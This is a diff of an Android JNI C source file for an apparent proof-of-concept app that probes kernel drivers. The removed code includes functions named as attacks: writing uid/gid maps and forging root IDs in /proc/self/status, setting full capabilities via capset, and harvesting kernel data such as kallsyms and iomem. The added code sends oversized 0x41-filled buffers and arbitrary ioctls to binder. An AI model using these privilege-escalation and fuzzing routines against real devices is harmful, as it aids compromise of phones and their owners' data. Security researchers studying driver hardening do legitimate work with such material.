@@ -7,42 +7,18 @@
 #include <fcntl.h>
 #include <errno.h>
 #include <android/log.h>
-#include <sys/stat.h>
-#include <limits.h>
 #include <sys/ioctl.h>
 #include <sys/types.h>
-#include <sys/socket.h>
-#include <sys/syscall.h>
-#include <linux/capability.h>
+#include <sys/stat.h>
+#include <limits.h>
 
 #include "binder.h"
 
-#define LOG_TAG "PocJNI"
+#define LOG_TAG "BinderPOC"
 #define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG, LOG_TAG, __VA_ARGS__)
 #define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__)
 
 static JavaVM* g_vm = NULL;
-
-#define ION_IOC_MAGIC 'I'
-#define ION_IOC_ALLOC _IOWR(ION_IOC_MAGIC, 0, struct ion_allocation_data)
-#define ION_IOC_FREE _IOWR(ION_IOC_MAGIC, 1, struct ion_handle_data)
-#define ION_IOC_MAP _IOWR(ION_IOC_MAGIC, 7, struct ion_fd_data)
-#define ION_HEAP_SYSTEM 25
-
-struct ion_allocation_data {
-    size_t len;
-    size_t align;
-    unsigned int heap_id_mask;
-    unsigned int flags;
-    unsigned int handle;
-};
-struct ion_fd_data {
-    unsigned int handle;
-    int fd;
-};
-struct ion_handle_data {
-    unsigned int handle;
-};
 
 JNIEXPORT jint JNICALL JNI_OnLoad(JavaVM* vm, void* reserved) {
     g_vm = vm;
@@ -54,8 +30,140 @@ JNIEXPORT void JNICALL JNI_OnUnload(JavaVM* vm, void* reserved) {
     LOGD("JNI_OnUnload");
 }
 
+// Helper: read file into string
+static char* read_file(const char* path) {
+    int fd = open(path, O_RDONLY);
+    if (fd < 0) return NULL;
+    char* buf = malloc(8192);
+    if (!buf) { close(fd); return NULL; }
+    ssize_t n = read(fd, buf, 8191);
+    close(fd);
+    if (n <= 0) { free(buf); return NULL; }
+    buf[n] = '\0';
+    return buf;
+}
+
+JNIEXPORT jstring JNICALL
+Java_com_example_tzpoc_MainActivity_nativeBinderVersion(JNIEnv* env, jclass clazz, jint fd) {
+    char result[128] = {0};
+    struct binder_version ver;
+    if (ioctl(fd, BINDER_VERSION, &ver) == 0) {
+        snprintf(result, sizeof(result), "Protocol version: %d", ver.protocol_version);
+    } else {
+        snprintf(result, sizeof(result), "BINDER_VERSION failed: %s", strerror(errno));
+    }
+    return (*env)->NewStringUTF(env, result);
+}
+
+JNIEXPORT jstring JNICALL
+Java_com_example_tzpoc_MainActivity_nativeBinderSetMaxThreads(JNIEnv* env, jclass clazz, jint fd, jint max) {
+    char result[128] = {0};
+    if (ioctl(fd, BINDER_SET_MAX_THREADS, &max) == 0) {
+        snprintf(result, sizeof(result), "Set max threads to %d OK", max);
+    } else {
+        snprintf(result, sizeof(result), "BINDER_SET_MAX_THREADS failed: %s", strerror(errno));
+    }
+    return (*env)->NewStringUTF(env, result);
+}
+
+JNIEXPORT jstring JNICALL
+Java_com_example_tzpoc_MainActivity_nativeBinderGetNodeInfo(JNIEnv* env, jclass clazz, jint fd, jint handle) {
+    char result[256] = {0};
+    struct binder_node_info_for_ref info;
+    memset(&info, 0, sizeof(info));
+    info.handle = handle;
+    if (ioctl(fd, BINDER_GET_NODE_INFO_FOR_REF, &info) == 0) {
+        snprintf(result, sizeof(result), "Node info: strong=%u weak=%u reserved1=%u reserved2=%u reserved3=%u",
+                 info.strong_count, info.weak_count, info.reserved1, info.reserved2, info.reserved3);
+    } else {
+        snprintf(result, sizeof(result), "BINDER_GET_NODE_INFO_FOR_REF failed: %s", strerror(errno));
+    }
+    return (*env)->NewStringUTF(env, result);
+}
+
+JNIEXPORT jstring JNICALL
+Java_com_example_tzpoc_MainActivity_nativeBinderTransaction(JNIEnv* env, jclass clazz, jint fd, jint targetHandle, jint flags) {
+    char result[512] = {0};
+    struct binder_write_read bwr;
+    memset(&bwr, 0, sizeof(bwr));
+
+    // Build transaction command
+    struct {
+        uint32_t cmd;
+        struct binder_transaction_data tdata;
+    } __attribute__((packed)) tx;
+    tx.cmd = BC_TRANSACTION;
+    memset(&tx.tdata, 0, sizeof(tx.tdata));
+    tx.tdata.target.handle = targetHandle;
+    tx.tdata.flags = flags;
+    tx.tdata.data_size = 0;
+    tx.tdata.offsets_size = 0;
+    tx.tdata.data.ptr.buffer = 0;
+    tx.tdata.data.ptr.offsets = 0;
+
+    bwr.write_size = sizeof(tx);
+    bwr.write_buffer = (binder_uintptr_t)&tx;
+
+    // Reserve read buffer for reply
+    struct binder_transaction_data reply;
+    bwr.read_size = sizeof(reply);
+    bwr.read_buffer = (binder_uintptr_t)&reply;
+
+    int ret = ioctl(fd, BINDER_WRITE_READ, &bwr);
+    if (ret == 0) {
+        snprintf(result, sizeof(result), "Transaction sent, read_consumed=%llu", (unsigned long long)bwr.read_consumed);
+        if (bwr.read_consumed > 0) {
+            strcat(result, " (reply received)");
+        }
+    } else {
+        snprintf(result, sizeof(result), "BINDER_WRITE_READ transaction failed: %s", strerror(errno));
+    }
+    return (*env)->NewStringUTF(env, result);
+}
+
+JNIEXPORT jstring JNICALL
+Java_com_example_tzpoc_MainActivity_nativeBinderOverflow(JNIEnv* env, jclass clazz, jint fd, jlong size) {
+    char result[256] = {0};
+    if (size <= 0) {
+        snprintf(result, sizeof(result), "Invalid size");
+        return (*env)->NewStringUTF(env, result);
+    }
+    char* buf = malloc((size_t)size);
+    if (!buf) {
+        snprintf(result, sizeof(result), "Failed to allocate %lld bytes", (long long)size);
+        return (*env)->NewStringUTF(env, result);
+    }
+    memset(buf, 0x41, (size_t)size);
+
+    struct binder_write_read bwr;
+    memset(&bwr, 0, sizeof(bwr));
+    bwr.write_size = (binder_size_t)size;
+    bwr.write_buffer = (binder_uintptr_t)buf;
+
+    int ret = ioctl(fd, BINDER_WRITE_READ, &bwr);
+    free(buf);
+    if (ret == 0) {
+        snprintf(result, sizeof(result), "Overflow write succeeded (unexpected)");
+    } else {
+        snprintf(result, sizeof(result), "Overflow write failed: %s (expected)", strerror(errno));
+    }
+    return (*env)->NewStringUTF(env, result);
+}
+
+JNIEXPORT jstring JNICALL
+Java_com_example_tzpoc_MainActivity_nativeBinderIoctlTest(JNIEnv* env, jclass clazz, jint fd, jint cmd, jlong arg) {
+    char result[256] = {0};
+    int ret = ioctl(fd, cmd, (unsigned long)arg);
+    if (ret == 0) {
+        snprintf(result, sizeof(result), "ioctl(0x%x) succeeded", cmd);
+    } else {
+        snprintf(result, sizeof(result), "ioctl(0x%x) failed: %s", cmd, strerror(errno));
+    }
+    return (*env)->NewStringUTF(env, result);
+}
+
 JNIEXPORT jobjectArray JNICALL
-Java_com_example_tzpoc_MainActivity_nativeListDir(JNIEnv* env, jclass clazz, jstring path) {
+Java_com_example_tzpoc_MainActivity_nativeBinderfsList(JNIEnv* env, jclass clazz, jstring path) {
     if (path == NULL) return NULL;
     const char* cpath = (*env)->GetStringUTFChars(env, path, NULL);
     if (cpath == NULL) return NULL;
@@ -99,607 +207,14 @@ Java_com_example_tzpoc_MainActivity_nativeListDir(JNIEnv* env, jclass clazz, jst
 }
 
 JNIEXPORT jstring JNICALL
-Java_com_example_tzpoc_MainActivity_nativeReadFile(JNIEnv* env, jclass clazz, jstring path) {
+Java_com_example_tzpoc_MainActivity_nativeBinderfsRead(JNIEnv* env, jclass clazz, jstring path) {
     if (path == NULL) return NULL;
     const char* cpath = (*env)->GetStringUTFChars(env, path, NULL);
     if (cpath == NULL) return NULL;
-    int fd = open(cpath, O_RDONLY);
+    char* content = read_file(cpath);
     (*env)->ReleaseStringUTFChars(env, path, cpath);
-    if (fd < 0) {
-        LOGE("open(%s) failed: %s", cpath, strerror(errno));
-        return NULL;
-    }
-    char buf[8192];
-    ssize_t len = read(fd, buf, sizeof(buf) - 1);
-    close(fd);
-    if (len <= 0) return NULL;
-    buf[len] = '\0';
-    return (*env)->NewStringUTF(env, buf);
-}
-
-JNIEXPORT jstring JNICALL
-Java_com_example_tzpoc_MainActivity_nativeWriteFile(JNIEnv* env, jclass clazz, jstring path, jstring content) {
-    if (path == NULL || content == NULL) return NULL;
-    const char* cpath = (*env)->GetStringUTFChars(env, path, NULL);
-    const char* ccontent = (*env)->GetStringUTFChars(env, content, NULL);
-    if (cpath == NULL || ccontent == NULL) {
-        if (cpath) (*env)->ReleaseStringUTFChars(env, path, cpath);
-        if (ccontent) (*env)->ReleaseStringUTFChars(env, content, ccontent);
-        return NULL;
-    }
-    int fd = open(cpath, O_WRONLY);
-    if (fd < 0) {
-        LOGE("open(%s) for write failed: %s", cpath, strerror(errno));
-        (*env)->ReleaseStringUTFChars(env, path, cpath);
-        (*env)->ReleaseStringUTFChars(env, content, ccontent);
-        return (*env)->NewStringUTF(env, strerror(errno));
-    }
-    ssize_t written = write(fd, ccontent, strlen(ccontent));
-    close(fd);
-    (*env)->ReleaseStringUTFChars(env, path, cpath);
-    (*env)->ReleaseStringUTFChars(env, content, ccontent);
-    if (written < 0) return (*env)->NewStringUTF(env, strerror(errno));
-    return (*env)->NewStringUTF(env, "OK");
-}
-
-JNIEXPORT jstring JNICALL
-Java_com_example_tzpoc_MainActivity_nativeReadLink(JNIEnv* env, jclass clazz, jstring path) {
-    if (path == NULL) return NULL;
-    const char* cpath = (*env)->GetStringUTFChars(env, path, NULL);
-    if (cpath == NULL) return NULL;
-    char buf[PATH_MAX];
-    ssize_t len = readlink(cpath, buf, sizeof(buf)-1);
-    (*env)->ReleaseStringUTFChars(env, path, cpath);
-    if (len < 0) {
-        LOGE("readlink(%s) failed: %s", cpath, strerror(errno));
-        return NULL;
-    }
-    buf[len] = '\0';
-    return (*env)->NewStringUTF(env, buf);
-}
-
-JNIEXPORT jstring JNICALL
-Java_com_example_tzpoc_MainActivity_nativeTestFd(JNIEnv* env, jclass clazz, jint fd) {
-    char buf[256] = {0};
-    int flags = fcntl(fd, F_GETFL);
-    if (flags < 0) {
-        snprintf(buf, sizeof(buf), "fcntl failed: %s", strerror(errno));
-        return (*env)->NewStringUTF(env, buf);
-    }
-    int type = flags & O_ACCMODE;
-    const char* type_str;
-    switch(type) {
-        case O_RDONLY: type_str = "RDONLY"; break;
-        case O_WRONLY: type_str = "WRONLY"; break;
-        case O_RDWR: type_str = "RDWR"; break;
-        default: type_str = "UNKNOWN";
-    }
-    snprintf(buf, sizeof(buf), "flags=0x%x (%s), nonblock=%d", flags, type_str, (flags & O_NONBLOCK)?1:0);
-    return (*env)->NewStringUTF(env, buf);
-}
-
-JNIEXPORT jint JNICALL
-Java_com_example_tzpoc_MainActivity_nativeOpenDevice(JNIEnv* env, jclass clazz, jstring path) {
-    if (path == NULL) return -1;
-    const char* cpath = (*env)->GetStringUTFChars(env, path, NULL);
-    if (cpath == NULL) return -1;
-    int fd = open(cpath, O_RDONLY);
-    if (fd < 0) {
-        LOGE("open(%s) failed: %s", cpath, strerror(errno));
-        (*env)->ReleaseStringUTFChars(env, path, cpath);
-        return -errno;
-    }
-    (*env)->ReleaseStringUTFChars(env, path, cpath);
-    return fd;
-}
-
-JNIEXPORT jstring JNICALL
-Java_com_example_tzpoc_MainActivity_nativeIonTest(JNIEnv* env, jclass clazz, jint fd) {
-    char result[256] = {0};
-    struct ion_allocation_data alloc_data = {
-        .len = 4096,
-        .align = 4096,
-        .heap_id_mask = 1 << ION_HEAP_SYSTEM,
-        .flags = 0,
-        .handle = 0
-    };
-    int ret = ioctl(fd, ION_IOC_ALLOC, &alloc_data);
-    if (ret < 0) {
-        snprintf(result, sizeof(result), "ION_IOC_ALLOC failed: %s", strerror(errno));
-        return (*env)->NewStringUTF(env, result);
-    }
-    struct ion_fd_data fd_data = { .handle = alloc_data.handle, .fd = 0 };
-    ret = ioctl(fd, ION_IOC_MAP, &fd_data);
-    if (ret < 0) {
-        snprintf(result, sizeof(result), "ION_IOC_MAP failed: %s", strerror(errno));
-        struct ion_handle_data handle_data = { .handle = alloc_data.handle };
-        ioctl(fd, ION_IOC_FREE, &handle_data);
-        return (*env)->NewStringUTF(env, result);
-    }
-    close(fd_data.fd);
-    struct ion_handle_data handle_data = { .handle = alloc_data.handle };
-    ioctl(fd, ION_IOC_FREE, &handle_data);
-    snprintf(result, sizeof(result), "ION test succeeded: allocated and mapped 4096 bytes (vulnerability may be exploitable)");
-    return (*env)->NewStringUTF(env, result);
-}
-
-JNIEXPORT jstring JNICALL
-Java_com_example_tzpoc_MainActivity_nativeHwbinderTest(JNIEnv* env, jclass clazz, jint fd) {
-    char result[256] = {0};
-    struct binder_version version;
-    if (ioctl(fd, BINDER_VERSION, &version) == 0) {
-        snprintf(result, sizeof(result), "Binder version: %d (protocol %d) - vulnerability may be exploitable",
-                 version.protocol_version, version.protocol_version);
-    } else {
-        snprintf(result, sizeof(result), "BINDER_VERSION failed: %s", strerror(errno));
-    }
-    return (*env)->NewStringUTF(env, result);
-}
-
-JNIEXPORT jstring JNICALL
-Java_com_example_tzpoc_MainActivity_nativeHwbinderFurther(JNIEnv* env, jclass clazz, jint fd) {
-    char result[512] = {0};
-    struct binder_version version;
-    if (ioctl(fd, BINDER_VERSION, &version) == 0) {
-        snprintf(result, sizeof(result), "Binder protocol: %d. ", version.protocol_version);
-    } else {
-        snprintf(result, sizeof(result), "BINDER_VERSION failed: %s. ", strerror(errno));
-    }
-
-    int max_threads = 10;
-    if (ioctl(fd, BINDER_SET_MAX_THREADS, &max_threads) == 0) {
-        strcat(result, "BINDER_SET_MAX_THREADS succeeded. ");
-    } else {
-        strcat(result, "BINDER_SET_MAX_THREADS failed: ");
-        strcat(result, strerror(errno));
-        strcat(result, ". ");
-    }
-
-    struct binder_node_info_for_ref info;
-    memset(&info, 0, sizeof(info));
-    info.handle = 0;
-    if (ioctl(fd, BINDER_GET_NODE_INFO_FOR_REF, &info) == 0) {
-        strcat(result, "BINDER_GET_NODE_INFO_FOR_REF succeeded: strong=");
-        char tmp[32];
-        sprintf(tmp, "%u", info.strong_count);
-        strcat(result, tmp);
-        strcat(result, " weak=");
-        sprintf(tmp, "%u", info.weak_count);
-        strcat(result, tmp);
-    } else {
-        strcat(result, "BINDER_GET_NODE_INFO_FOR_REF failed: ");
-        strcat(result, strerror(errno));
-    }
-    return (*env)->NewStringUTF(env, result);
-}
-
-JNIEXPORT jstring JNICALL
-Java_com_example_tzpoc_MainActivity_nativeGetKernelInfo(JNIEnv* env, jclass clazz) {
-    char result[4096] = {0};
-    const char* files[] = {
-        "/proc/version", "/proc/cmdline", "/proc/meminfo", "/proc/iomem", "/proc/modules",
-        "/proc/sys/kernel/ostype", "/proc/sys/kernel/osrelease",
-        "/sys/kernel/debug/kallsyms", "/sys/kernel/security/lsm",
-        "/proc/self/status", "/proc/self/stat"
-    };
-    char buf[1024];
-    for (size_t i = 0; i < sizeof(files)/sizeof(files[0]); i++) {
-        int fd = open(files[i], O_RDONLY);
-        if (fd >= 0) {
-            ssize_t n = read(fd, buf, sizeof(buf)-1);
-            close(fd);
-            if (n > 0) {
-                buf[n] = '\0';
-                strcat(result, files[i]);
-                strcat(result, ": ");
-                strcat(result, buf);
-                strcat(result, "\n");
-            } else {
-                strcat(result, files[i]);
-                strcat(result, ": (empty)\n");
-            }
-        } else {
-            strcat(result, files[i]);
-            strcat(result, ": (unreadable)\n");
-        }
-    }
-    return (*env)->NewStringUTF(env, result);
-}
-
-JNIEXPORT jstring JNICALL
-Java_com_example_tzpoc_MainActivity_nativeBinderAdvancedTest(JNIEnv* env, jclass clazz, jint fd) {
-    char result[1024] = {0};
-    int ret;
-
-    struct binder_version version;
-    if (ioctl(fd, BINDER_VERSION, &version) == 0) {
-        snprintf(result, sizeof(result), "Binder protocol version: %d\n", version.protocol_version);
-    } else {
-        snprintf(result, sizeof(result), "Failed to get version: %s\n", strerror(errno));
-        return (*env)->NewStringUTF(env, result);
-    }
-
-    int max_threads = 10;
-    if (ioctl(fd, BINDER_SET_MAX_THREADS, &max_threads) == 0) {
-        strcat(result, "BINDER_SET_MAX_THREADS succeeded (set to 10).\n");
-    } else {
-        strcat(result, "BINDER_SET_MAX_THREADS failed: ");
-        strcat(result, strerror(errno));
-        strcat(result, "\n");
-    }
-
-    struct binder_node_info_for_ref info;
-    memset(&info, 0, sizeof(info));
-    info.handle = 0;
-    if (ioctl(fd, BINDER_GET_NODE_INFO_FOR_REF, &info) == 0) {
-        char tmp[64];
-        snprintf(tmp, sizeof(tmp), "Node info for handle 0: strong=%u weak=%u\n", info.strong_count, info.weak_count);
-        strcat(result, tmp);
-    } else {
-        strcat(result, "BINDER_GET_NODE_INFO_FOR_REF failed: ");
-        strcat(result, strerror(errno));
-        strcat(result, " (expected without permission)\n");
-    }
-
-    struct {
-        uint32_t cmd;
-        struct binder_transaction_data tdata;
-    } __attribute__((packed)) tx = {
-        .cmd = BC_TRANSACTION,
-        .tdata = {
-            .target.handle = 0,
-            .cookie = 0,
-            .code = 0,
-            .flags = 0,
-            .sender_pid = 0,
-            .sender_euid = 0,
-            .data_size = 0,
-            .offsets_size = 0,
-            .data.ptr.buffer = 0,
-            .data.ptr.offsets = 0
-        }
-    };
-
-    struct binder_write_read bwr;
-    memset(&bwr, 0, sizeof(bwr));
-    bwr.write_size = sizeof(tx);
-    bwr.write_buffer = (binder_uintptr_t)&tx;
-
-    struct binder_transaction_data reply_data;
-    bwr.read_size = sizeof(reply_data);
-    bwr.read_buffer = (binder_uintptr_t)&reply_data;
-
-    ret = ioctl(fd, BINDER_WRITE_READ, &bwr);
-    if (ret == 0) {
-        strcat(result, "BINDER_WRITE_READ with transaction succeeded (unexpected). ");
-        if (bwr.read_consumed > 0) {
-            strcat(result, "Reply received.\n");
-        }
-    } else {
-        strcat(result, "BINDER_WRITE_READ transaction failed: ");
-        strcat(result, strerror(errno));
-        strcat(result, " (expected, permission denied or handle invalid)\n");
-    }
-
-    struct binder_node_debug_info debug_info;
-    memset(&debug_info, 0, sizeof(debug_info));
-    if (ioctl(fd, BINDER_GET_NODE_DEBUG_INFO, &debug_info) == 0) {
-        char tmp[128];
-        snprintf(tmp, sizeof(tmp), "Node debug info: ptr=%llx cookie=%llx strong=%u weak=%u\n",
-                 (unsigned long long)debug_info.ptr, (unsigned long long)debug_info.cookie,
-                 debug_info.has_strong_ref, debug_info.has_weak_ref);
-        strcat(result, tmp);
-    } else {
-        strcat(result, "BINDER_GET_NODE_DEBUG_INFO failed: ");
-        strcat(result, strerror(errno));
-        strcat(result, " (likely requires root)\n");
-    }
-
-    return (*env)->NewStringUTF(env, result);
-}
-
-JNIEXPORT jstring JNICALL
-Java_com_example_tzpoc_MainActivity_nativeHwbinderOverflowTest(JNIEnv* env, jclass clazz, jint fd) {
-    char result[512] = {0};
-    size_t huge_size = 1024 * 1024 * 64;
-    char* huge_buf = malloc(huge_size);
-    if (!huge_buf) {
-        snprintf(result, sizeof(result), "Overflow test: failed to allocate %zu bytes", huge_size);
-        return (*env)->NewStringUTF(env, result);
-    }
-    memset(huge_buf, 0x41, huge_size);
-
-    struct binder_write_read bwr;
-    memset(&bwr, 0, sizeof(bwr));
-    bwr.write_size = huge_size;
-    bwr.write_buffer = (binder_uintptr_t)huge_buf;
-
-    int ret = ioctl(fd, BINDER_WRITE_READ, &bwr);
-    free(huge_buf);
-    if (ret == 0) {
-        snprintf(result, sizeof(result), "Overflow test: BINDER_WRITE_READ with huge buffer succeeded (unexpected)");
-    } else {
-        snprintf(result, sizeof(result), "Overflow test: BINDER_WRITE_READ with huge buffer failed: %s (expected error)", strerror(errno));
-    }
-    return (*env)->NewStringUTF(env, result);
-}
-
-JNIEXPORT jstring JNICALL
-Java_com_example_tzpoc_MainActivity_nativeHwbinderWriteTest(JNIEnv* env, jclass clazz, jint fd) {
-    char result[256] = {0};
-    struct binder_write_read bwr;
-    memset(&bwr, 0, sizeof(bwr));
-
-    struct {
-        uint32_t cmd;
-        struct binder_transaction_data tdata;
-    } __attribute__((packed)) tx = {
-        .cmd = BC_TRANSACTION,
-        .tdata = {
-            .target.handle = 1,
-            .cookie = 0,
-            .code = 0,
-            .flags = 0,
-            .sender_pid = 0,
-            .sender_euid = 0,
-            .data_size = 0,
-            .offsets_size = 0,
-            .data.ptr.buffer = 0,
-            .data.ptr.offsets = 0
-        }
-    };
-
-    bwr.write_size = sizeof(tx);
-    bwr.write_buffer = (binder_uintptr_t)&tx;
-
-    int ret = ioctl(fd, BINDER_WRITE_READ, &bwr);
-    if (ret == 0) {
-        snprintf(result, sizeof(result), "Write test: BINDER_WRITE_READ with BC_TRANSACTION succeeded (handle 1)");
-    } else {
-        snprintf(result, sizeof(result), "Write test: BINDER_WRITE_READ with BC_TRANSACTION failed: %s", strerror(errno));
-    }
-    return (*env)->NewStringUTF(env, result);
-}
-
-JNIEXPORT jstring JNICALL
-Java_com_example_tzpoc_MainActivity_nativeHwbinderHalCommand(JNIEnv* env, jclass clazz, jint fd) {
-    char result[512] = {0};
-    struct binder_write_read bwr;
-    memset(&bwr, 0, sizeof(bwr));
-
-    struct {
-        uint32_t cmd;
-        struct binder_transaction_data tdata;
-    } __attribute__((packed)) tx = {
-        .cmd = BC_TRANSACTION,
-        .tdata = {
-            .target.handle = 0,
-            .cookie = 0,
-            .code = 0,
-            .flags = TF_ONE_WAY,
-            .sender_pid = 0,
-            .sender_euid = 0,
-            .data_size = 0,
-            .offsets_size = 0,
-            .data.ptr.buffer = 0,
-            .data.ptr.offsets = 0
-        }
-    };
-
-    bwr.write_size = sizeof(tx);
-    bwr.write_buffer = (binder_uintptr_t)&tx;
-
-    struct binder_transaction_data reply;
-    bwr.read_size = sizeof(reply);
-    bwr.read_buffer = (binder_uintptr_t)&reply;
-
-    int ret = ioctl(fd, BINDER_WRITE_READ, &bwr);
-    if (ret == 0) {
-        strcat(result, "HAL command test: BINDER_WRITE_READ with BC_TRANSACTION (handle 0, oneway) succeeded. ");
-        if (bwr.read_consumed > 0) {
-            strcat(result, "Reply received (unexpected for oneway).");
-        } else {
-            strcat(result, "No reply (as expected for oneway).");
-        }
-    } else {
-        strcat(result, "HAL command test: BINDER_WRITE_READ failed: ");
-        strcat(result, strerror(errno));
-    }
-    return (*env)->NewStringUTF(env, result);
-}
-
-JNIEXPORT jstring JNICALL
-Java_com_example_tzpoc_MainActivity_nativeHwbinderReadTest(JNIEnv* env, jclass clazz, jint fd) {
-    char result[512] = {0};
-    struct binder_write_read bwr;
-    memset(&bwr, 0, sizeof(bwr));
-
-    struct {
-        uint32_t cmd;
-        struct binder_transaction_data tdata;
-    } __attribute__((packed)) tx = {
-        .cmd = BC_TRANSACTION,
-        .tdata = {
-            .target.handle = 0,
-            .cookie = 0,
-            .code = 0,
-            .flags = 0,
-            .sender_pid = 0,
-            .sender_euid = 0,
-            .data_size = 0,
-            .offsets_size = 0,
-            .data.ptr.buffer = 0,
-            .data.ptr.offsets = 0
-        }
-    };
-
-    bwr.write_size = sizeof(tx);
-    bwr.write_buffer = (binder_uintptr_t)&tx;
-
-    struct binder_transaction_data reply;
-    bwr.read_size = sizeof(reply);
-    bwr.read_buffer = (binder_uintptr_t)&reply;
-
-    int ret = ioctl(fd, BINDER_WRITE_READ, &bwr);
-    if (ret == 0) {
-        strcat(result, "Read test: BINDER_WRITE_READ succeeded. ");
-        if (bwr.read_consumed > 0) {
-            strcat(result, "Reply data read (");
-            char tmp[32];
-            sprintf(tmp, "%llu", (unsigned long long)bwr.read_consumed);
-            strcat(result, tmp);
-            strcat(result, " bytes).");
-        } else {
-            strcat(result, "No reply data.");
-        }
-    } else {
-        strcat(result, "Read test: BINDER_WRITE_READ failed: ");
-        strcat(result, strerror(errno));
-    }
-    return (*env)->NewStringUTF(env, result);
-}
-
-JNIEXPORT jstring JNICALL
-Java_com_example_tzpoc_MainActivity_nativeBinderGetVersion(JNIEnv* env, jclass clazz, jint fd) {
-    char result[128] = {0};
-    struct binder_version version;
-    if (ioctl(fd, BINDER_VERSION, &version) == 0) {
-        snprintf(result, sizeof(result), "Protocol version: %d", version.protocol_version);
-    } else {
-        snprintf(result, sizeof(result), "BINDER_VERSION failed: %s", strerror(errno));
-    }
-    return (*env)->NewStringUTF(env, result);
-}
-
-JNIEXPORT jstring JNICALL
-Java_com_example_tzpoc_MainActivity_nativeBinderIoctlTest(JNIEnv* env, jclass clazz, jint fd, jint cmd, jlong arg) {
-    char result[256] = {0};
-    int ret = ioctl(fd, cmd, (unsigned long)arg);
-    if (ret == 0) {
-        snprintf(result, sizeof(result), "ioctl(0x%x) succeeded", cmd);
-    } else {
-        snprintf(result, sizeof(result), "ioctl(0x%x) failed: %s", cmd, strerror(errno));
-    }
-    return (*env)->NewStringUTF(env, result);
-}
-
-JNIEXPORT jstring JNICALL
-Java_com_example_tzpoc_MainActivity_nativeUidGidAttack(JNIEnv* env, jclass clazz) {
-    char result[512] = {0};
-    int fd;
-
-    // 1. Write "deny" to /proc/self/setgroups to allow gid mapping
-    fd = open("/proc/self/setgroups", O_WRONLY);
-    if (fd >= 0) {
-        if (write(fd, "deny", 4) == 4) {
-            strcat(result, "setgroups: deny OK; ");
-        } else {
-            strcat(result, "setgroups write failed; ");
-        }
-        close(fd);
-    } else {
-        strcat(result, "setgroups open failed; ");
-    }
-
-    // 2. Write "0 0 1" to /proc/self/uid_map
-    fd = open("/proc/self/uid_map", O_WRONLY);
-    if (fd >= 0) {
-        if (write(fd, "0 0 1\n", 6) == 6) {
-            strcat(result, "uid_map write OK; ");
-        } else {
-            strcat(result, "uid_map write failed; ");
-        }
-        close(fd);
-    } else {
-        strcat(result, "uid_map open failed; ");
-    }
-
-    // 3. Write "0 0 1" to /proc/self/gid_map
-    fd = open("/proc/self/gid_map", O_WRONLY);
-    if (fd >= 0) {
-        if (write(fd, "0 0 1\n", 6) == 6) {
-            strcat(result, "gid_map write OK; ");
-        } else {
-            strcat(result, "gid_map write failed; ");
-        }
-        close(fd);
-    } else {
-        strcat(result, "gid_map open failed; ");
-    }
-
-    // 4. Try to write directly to /proc/self/status (should fail)
-    fd = open("/proc/self/status", O_WRONLY);
-    if (fd >= 0) {
-        if (write(fd, "Uid: 0 0 0 0\nGid: 0 0 0 0\n", 24) == 24) {
-            strcat(result, "status write OK (unexpected); ");
-        } else {
-            strcat(result, "status write failed (expected); ");
-        }
-        close(fd);
-    } else {
-        strcat(result, "status open failed; ");
-    }
-
-    // 5. Read back /proc/self/status to see if any change occurred
-    char status_buf[4096] = {0};
-    fd = open("/proc/self/status", O_RDONLY);
-    if (fd >= 0) {
-        ssize_t n = read(fd, status_buf, sizeof(status_buf)-1);
-        close(fd);
-        if (n > 0) {
-            status_buf[n] = '\0';
-            // extract Uid and Gid lines
-            char* uid_line = strstr(status_buf, "Uid:");
-            char* gid_line = strstr(status_buf, "Gid:");
-            if (uid_line) {
-                char* end = strchr(uid_line, '\n');
-                if (end) *end = '\0';
-                strcat(result, "Uid: ");
-                strcat(result, uid_line + 4);
-                strcat(result, "; ");
-            }
-            if (gid_line) {
-                char* end = strchr(gid_line, '\n');
-                if (end) *end = '\0';
-                strcat(result, "Gid: ");
-                strcat(result, gid_line + 4);
-            }
-        } else {
-            strcat(result, "status read failed; ");
-        }
-    } else {
-        strcat(result, "status re-open failed; ");
-    }
-
-    return (*env)->NewStringUTF(env, result);
-}
-
-JNIEXPORT jstring JNICALL
-Java_com_example_tzpoc_MainActivity_nativeCapAttack(JNIEnv* env, jclass clazz) {
-    char result[256] = {0};
-    struct __user_cap_header_struct cap_header;
-    struct __user_cap_data_struct cap_data[2];
-
-    cap_header.version = _LINUX_CAPABILITY_VERSION_3;
-    cap_header.pid = getpid();
-
-    // Fill with all capabilities (0x3fffffff)
-    cap_data[0].effective = 0x3fffffff;
-    cap_data[0].permitted = 0x3fffffff;
-    cap_data[0].inheritable = 0x3fffffff;
-    cap_data[1].effective = 0x3fffffff;
-    cap_data[1].permitted = 0x3fffffff;
-    cap_data[1].inheritable = 0x3fffffff;
-
-    // For version 3, we need to set the second cap_data for bits 32-63, but we use all caps.
-    // Actually 0x3fffffff is only 30 bits, but all caps up to CAP_LAST_CAP (maybe 63).
-    // We'll set both to full.
-
-    int ret = syscall(__NR_capset, &cap_header, &cap_data);
-    if (ret == 0) {
-        snprintf(result, sizeof(result), "capset succeeded: capabilities set to full (0x3fffffff)");
-    } else {
-        snprintf(result, sizeof(result), "capset failed: %s", strerror(errno));
-    }
-    return (*env)->NewStringUTF(env, result);
+    if (content == NULL) return NULL;
+    jstring result = (*env)->NewStringUTF(env, content);
+    free(content);
+    return result;
 }
